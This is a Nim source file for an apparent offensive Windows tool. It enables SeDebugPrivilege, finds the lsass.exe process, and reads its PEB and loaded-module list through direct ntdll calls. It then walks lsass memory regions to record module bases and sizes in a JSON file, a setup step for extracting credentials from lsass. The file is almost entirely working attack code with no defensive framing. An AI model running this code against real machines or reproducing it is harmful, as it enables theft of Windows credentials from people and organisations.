import winim/lean
import strformat
import strutils
import std/json


const
  MAX_PATH = 260
  ProcessBasicInformationSize = 48
  PebOffset = 0x8
  LdrOffset = 0x18
  InInitializationOrderModuleListOffset = 0x30
  FLinkDllBaseOffset = 0x20
  FLinkBufferFullDllNameOffset = 0x40
  FLinkBufferOffset = 0x50

type
  ModuleInformation* = object
    base_dll_name*: array[MAX_PATH, char]
    full_dll_path*: array[MAX_PATH, char]
    dll_base*: PVOID
    size*: int

type
  Luid* = object
    lowPart*: DWORD
    highPart*: DWORD

  TokenPrivileges* = object
    privilegeCount*: DWORD
    luid*: Luid
    attributes*: DWORD

type
  PROCESSINFOCLASS* = enum
    ProcessBasicInformation = 0

type MEMORY_INFORMATION_CLASS* = enum
    MemoryBasicInformation = 0


proc NtOpenProcessToken(ProcessHandle: HANDLE, DesiredAccess: DWORD, TokenHandle: PHANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtOpenProcessToken".}
proc NtAdjustPrivilegesToken(TokenHandle: HANDLE, DisableAllPrivileges: BOOLEAN, NewState: ptr TokenPrivileges, BufferLength: DWORD, PreviousState: PVOID, ReturnLength: PDWORD): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtAdjustPrivilegesToken".}
proc NtClose(Handle: HANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtClose".}
proc NtGetNextProcess(ProcessHandle: HANDLE, DesiredAccess: ACCESS_MASK, HandleAttributes: ULONG, Flags: ULONG, NewProcessHandle: PHANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtGetNextProcess".}
proc NtQueryInformationProcess(
    ProcessHandle: HANDLE,
    ProcessInformationClass: PROCESSINFOCLASS,
    ProcessInformation: PVOID,
    ProcessInformationLength: ULONG,
    ReturnLength: PULONG
): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtQueryInformationProcess".}
proc NtReadVirtualMemory(
    ProcessHandle: HANDLE,
    BaseAddress: PVOID,
    Buffer: PVOID,
    BufferSize: SIZE_T,
    NumberOfBytesRead: PSIZE_T
): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtReadVirtualMemory".}
proc NtQueryVirtualMemory(
    ProcessHandle: HANDLE,
    BaseAddress: PVOID,
    MemoryInformationClass: MEMORY_INFORMATION_CLASS,
    MemoryInformation: PVOID,
    MemoryInformationLength: SIZE_T,
    ReturnLength: PSIZE_T
): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtQueryVirtualMemory".}


proc enableDebugPrivileges*() =
  let currentProcess = GetCurrentProcess()
  var tokenHandle: HANDLE

  # Open process token
  let openStatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY or TOKEN_ADJUST_PRIVILEGES, addr tokenHandle)
  if openStatus != 0:
    echo "[-] NtOpenProcessToken failed. NTSTATUS: 0x", toHex(cast[int32](openStatus), 8)
    quit(-1)

  # Prepare privilege structure
  var tp = TokenPrivileges(
    privilegeCount: 1,
    luid: Luid(lowPart: 20, highPart: 0),
    attributes: SE_PRIVILEGE_ENABLED
  )

  # Adjust token privileges
  let adjustStatus = NtAdjustPrivilegesToken(tokenHandle, FALSE, addr tp, DWORD(sizeof(tp)), nil, nil)
  if adjustStatus != 0:
    echo "[-] NtAdjustPrivilegesToken failed. NTSTATUS: 0x", toHex(cast[int32](adjustStatus), 8)
    NtClose(tokenHandle)
    quit(-1)

  # Cleanup
  NtClose(tokenHandle)

  echo "[+] SeDebugPrivilege successfully enabled"


proc readRemoteIntPtr*(hProcess: HANDLE, memAddress: PVOID): PVOID =
    var
        buff: array[8, BYTE]
        bytesRead: SIZE_T
    
    let ntstatus = NtReadVirtualMemory(
        hProcess,
        memAddress,
        addr buff[0],
        sizeof(buff).SIZE_T,
        addr bytesRead
    )

    # Allowed status codes: SUCCESS (0), ACCESS_VIOLATION (0xC0000005), INVALID_PARAMETER (0x8000000D)
    if ntstatus != 0 and ntstatus != 0xC0000005 and ntstatus != 0x8000000D and hProcess != 0:
        echo fmt"[-] Error calling NtReadVirtualMemory (readRemoteIntPtr). NTSTATUS: 0x{cast[int](ntstatus):X} reading address 0x{cast[int](memAddress):X}"
        return nil
    
    result = cast[PVOID](cast[ptr int64](addr buff[0])[])


proc readRemoteWStr*(hProcess: HANDLE, memAddress: PVOID): string =
    var
        buff: array[256, BYTE]
        bytesRead: SIZE_T
    
    let ntstatus = NtReadVirtualMemory(
        hProcess,
        memAddress,
        addr buff[0],
        sizeof(buff).SIZE_T,
        addr bytesRead
    )

    if ntstatus != 0 and ntstatus != 0xC0000005 and ntstatus != 0x8000000D and hProcess != 0:
        echo fmt"[-] Error calling NtReadVirtualMemory (readRemoteWStr). NTSTATUS: 0x{cast[int](ntstatus):X} reading address 0x{cast[int](memAddress):X}"

    var unicodeStr = ""
    var i = 0
    while i < sizeof(buff) - 1:
        if buff[i] == 0 and buff[i+1] == 0:
            break
        
        let wch = cast[ptr WCHAR](addr buff[i])[]
        unicodeStr.add(char(wch))
        i += 2
    
    return unicodeStr


proc getProcNameFromHandle*(processHandle: HANDLE): string =
    const
        ProcessBasicInformationSize = 48
        PebOffset = 0x8
        CommandLineOffset = 0x68
        ProcessParametersOffset = 0x20

    var
        pbiByteArray: array[ProcessBasicInformationSize, BYTE]
        returnLength: ULONG

    # Query process information
    let ntstatus = NtQueryInformationProcess(
        processHandle,
        ProcessBasicInformation,  # Note: Using the enum value, not the type
        cast[PVOID](addr pbiByteArray[0]),
        ProcessBasicInformationSize.ULONG,
        addr returnLength
    )

    if ntstatus != 0:
        echo fmt"[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x{cast[int](ntstatus):08X}"
        return ""

    # Rest of the implementation remains the same...
    # Get PEB Base Address
    let pebPointer = cast[PVOID](cast[uint](addr pbiByteArray[0]) + PebOffset)
    let pebAddress = cast[PVOID](cast[ptr PVOID](pebPointer)[])

    # Get PEB->ProcessParameters
    let processParametersPointer = cast[PVOID](cast[uint](pebAddress) + ProcessParametersOffset)

    # Get ProcessParameters->CommandLine
    let processParametersAddress = readRemoteIntPtr(processHandle, processParametersPointer)
    let commandLinePointer = cast[PVOID](cast[uint](processParametersAddress) + CommandLineOffset)
    let commandLineAddress = readRemoteIntPtr(processHandle, commandLinePointer)
    let commandLineValue = readRemoteWStr(processHandle, commandLineAddress)

    return commandLineValue


proc toLowercase*(str: var string) =
    ## Converts a string to lowercase in-place (modifies original)
    for i in 0..<str.len:
        str[i] = str[i].toLowerAscii()


proc getProcessByName*(procName: string): HANDLE =
    let targetName = procName.toLowerAscii()  # Use Nim's built-in
    
    var auxHandle: HANDLE = 0
    while NT_SUCCESS(NtGetNextProcess(auxHandle, MAXIMUM_ALLOWED, 0, 0, addr auxHandle)):
        let currentName = getProcNameFromHandle(auxHandle).toLowerAscii()
        if currentName == targetName:
            return auxHandle
    return 0


proc customGetModuleHandle*(hProcess: HANDLE, moduleCount: ptr int): ptr ModuleInformation =
  var
    moduleList = cast[ptr ModuleInformation](alloc(1024 * sizeof(ModuleInformation)))
    moduleCounter = 0
    pbiByteArray: array[ProcessBasicInformationSize, BYTE]
    returnLength: ULONG

  # Query process information
  let ntstatus = NtQueryInformationProcess(
    hProcess,
    ProcessBasicInformation,
    cast[PVOID](addr pbiByteArray[0]),
    ProcessBasicInformationSize.ULONG,
    addr returnLength
  )

  if ntstatus != 0:
    echo "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x", toHex(cast[int](ntstatus), 8)
    return nil

    # Get PEB address
  let pebPointer = cast[uint](addr pbiByteArray[0]) + PebOffset
  let pebAddress = cast[ptr PVOID](pebPointer)[]
  echo "[+] PEB Address: \t0x", toHex(cast[int](pebAddress), 8), "p"

  # Get LDR address
  let ldrPointer = cast[uint](pebAddress) + LdrOffset
  let ldrAddress = readRemoteIntPtr(hProcess, cast[PVOID](ldrPointer))
  echo "[+] Ldr Pointer: \t0x", toHex(cast[int](ldrPointer)), "p"
  echo "[+] Ldr Address: \t0x", toHex(cast[int](ldrAddress)), "p"

  # Get module list
  let initOrderModuleList = cast[uint](ldrAddress) + InInitializationOrderModuleListOffset
  var nextFlink = readRemoteIntPtr(hProcess, cast[PVOID](initOrderModuleList))

  var dllBase: PVOID
  while true:
    dllBase = nil
    nextFlink = cast[PVOID](cast[uint](nextFlink) - 0x10)
    dllBase = readRemoteIntPtr(hProcess, cast[PVOID](cast[uint](nextFlink) + FLinkDllBaseOffset))

    if dllBase == nil:
      break

    let buffer = readRemoteIntPtr(hProcess, cast[PVOID](cast[uint](nextFlink) + FLinkBufferOffset))
    let baseDllName = readRemoteWStr(hProcess, buffer)

    var newModule: ModuleInformation
    copyMem(addr newModule.base_dll_name[0], addr baseDllName[0], min(baseDllName.len, MAX_PATH - 1))

    # Get full DLL path
    let fullDllNameAddr = readRemoteIntPtr(hProcess, cast[PVOID](cast[uint](nextFlink) + FLinkBufferFullDllNameOffset))
    let fullDllName = readRemoteWStr(hProcess, fullDllNameAddr)
    copyMem(addr newModule.full_dll_path[0], addr fullDllName[0], min(fullDllName.len, MAX_PATH - 1))

    newModule.dll_base = dllBase
    newModule.size = 0

    # Add module to list
    copyMem(cast[pointer](cast[ByteAddress](moduleList) + moduleCounter * sizeof(ModuleInformation)), 
        addr newModule, 
        sizeof(ModuleInformation))
    moduleCounter += 1

    nextFlink = readRemoteIntPtr(hProcess, cast[PVOID](cast[uint](nextFlink) + 0x10))

  moduleCount[] = moduleCounter
  return moduleList


proc findModuleByName*(moduleList: ptr ModuleInformation, listSize: int, auxName: array[MAX_PATH, char]): ModuleInformation =
    ## Finds a module by name in the module list
    for i in 0..<listSize:
        let currentModule = cast[ptr UncheckedArray[ModuleInformation]](moduleList)[i]
        if cmpIgnoreCase($currentModule.base_dll_name, $cast[cstring](addr auxName[0])) == 0:
            return currentModule
    
    # Return empty module if not found
    var emptyModule: ModuleInformation
    zeroMem(addr emptyModule, sizeof(ModuleInformation))
    return emptyModule


proc findModuleIndexByName*(
    moduleList: ptr ModuleInformation,
    listSize: int,
    auxName: array[MAX_PATH, char]
): int =
  ## Finds the index of a module by name by comparing null-terminated strings
  # Convert auxName buffer to a Nim string (C-style null-terminated)
  let target = $cast[cstring](addr auxName[0])
  for i in 0..<listSize:
    let currentModule = cast[ptr UncheckedArray[ModuleInformation]](moduleList)[i]
    # Convert module's base_dll_name buffer to Nim string
    let name = $cast[cstring](addr currentModule.base_dll_name[0])
    # Compare case-insensitively
    if cmpIgnoreCase(name, target) == 0:
      return i
  return -1


proc replaceBackslash(src: cstring): string =
  result = $src
  result = result.replace("\\", "\\\\")


when isMainModule:
  enableDebugPrivileges()
  let hProcess = getProcessByName("C:\\WINDOWS\\system32\\lsass.exe")
  if hProcess == 0:
    quit(-1)

  var moduleCounter: int = 0
  let moduleInformationList = customGetModuleHandle(hProcess, addr moduleCounter)
  echo "[+] Processed ", moduleCounter, " modules"

  # Initialize scan variables
  var
    procMaxAddress = 0x7FFFFFFEFFFF'u64
    memAddress: PVOID = nil
    auxSize = 0
    auxName: array[MAX_PATH, char]

  # Scan memory regions
  let moduleArray = cast[ptr UncheckedArray[ModuleInformation]](moduleInformationList)
  while cast[uint64](memAddress) < procMaxAddress:
      var mbi: MEMORY_BASIC_INFORMATION
      var returnSize: SIZE_T

      # Query memory info
      let ntstatus = NtQueryVirtualMemory(
          hProcess,
          memAddress,
          MemoryBasicInformation,
          addr mbi,
          sizeof(mbi).SIZE_T,
          addr returnSize
      )
      
      if ntstatus != 0:
          echo fmt"[-] Error NtQueryVirtualMemory: 0x{ntstatus:X}"
          break

      if mbi.Protect != PAGE_NOACCESS and mbi.State == MEM_COMMIT:
          # Get current module info
          let currentModule = findModuleByName(moduleInformationList, moduleCounter, auxName)
          
          # C++-style boundary check
          if mbi.RegionSize == 0x1000 and mbi.BaseAddress != currentModule.dll_base:
              let auxIndex = findModuleIndexByName(moduleInformationList, moduleCounter, auxName)
              if auxIndex >= 0:
                  var modifiedModule = moduleArray[auxIndex]
                  modifiedModule.size = auxSize
                  copyMem(
                      cast[pointer](cast[ByteAddress](moduleInformationList) + auxIndex * sizeof(ModuleInformation)),
                      addr modifiedModule,
                      sizeof(ModuleInformation)
                  )
          
          # Module detection
          var foundIndex = -1
          for k in 0..<moduleCounter:
              if mbi.BaseAddress == moduleArray[k].dll_base:
                  foundIndex = k
                  break
          
          if foundIndex >= 0:
              # Finalize previous module
              if auxName[0] != '\0':
                  let prevIndex = findModuleIndexByName(moduleInformationList, moduleCounter, auxName)
                  if prevIndex >= 0:
                      var prevMod = moduleArray[prevIndex]
                      prevMod.size = auxSize
                      copyMem(
                          cast[pointer](cast[ByteAddress](moduleInformationList) + prevIndex * sizeof(ModuleInformation)),
                          addr prevMod,
                          sizeof(ModuleInformation)
                      )
              
              # Start new module
              copyMem(addr auxName[0], addr moduleArray[foundIndex].base_dll_name[0], MAX_PATH)
              auxSize = cast[int](mbi.RegionSize)
          else:
              # Accumulate size
              auxSize += cast[int](mbi.RegionSize)
      
      # Move to next region
      memAddress = cast[PVOID](cast[uint64](memAddress) + cast[uint64](mbi.RegionSize))

  # Finalize last module
  if auxName[0] != '\0':
      let lastIndex = findModuleIndexByName(moduleInformationList, moduleCounter, auxName)
      if lastIndex >= 0:
          var lastMod = moduleArray[lastIndex]
          lastMod.size = auxSize
          copyMem(
              cast[pointer](cast[ByteAddress](moduleInformationList) + lastIndex * sizeof(ModuleInformation)),
              addr lastMod,
              sizeof(ModuleInformation)
          )

  # Finalize last module
  let lastIndex = findModuleIndexByName(moduleInformationList, moduleCounter, auxName)
  if lastIndex >= 0:
    var lastMod = moduleArray[lastIndex]
    lastMod.size = auxSize
    copyMem(addr moduleArray[lastIndex], addr lastMod, sizeof(ModuleInformation))

  # Output modules
  #for i in 0..<moduleCounter:
    #let m = moduleArray[i]
    #echo "Module ", i+1, ":"
    #echo "  Name: ", $cast[cstring](addr m.base_dll_name[0])
    #echo "  Path: ", $cast[cstring](addr m.full_dll_path[0])
    #echo "  Base: 0x", toHex(cast[int](m.dll_base))
    #echo "  Size: 0x", toHex(cast[int](m.size))

  var jsonItems: seq[JsonNode] = @[]
  for i in 0..<moduleCounter:
    let module = moduleArray[i]
    if module.dll_base != nil:
      let baseName = $cast[cstring](addr module.base_dll_name[0])
      let fullPath = replaceBackslash(cast[cstring](addr module.full_dll_path[0]))
      let baseAddrStr = &"0x{cast[int](module.dll_base):X}"
      
      let item = %*{
        "field0": baseName,
        "field1": fullPath,
        "field2": baseAddrStr,
        "field3": module.size
      }
      jsonItems.add(item)

  let finalJson = %jsonItems
  let filename = "shock.json"

  try:
    writeFile(filename, $finalJson)
    echo "[+] File ", filename, " generated."

  except IOError as e:
    echo "[-] Error opening file ", filename, ": ", e.msg
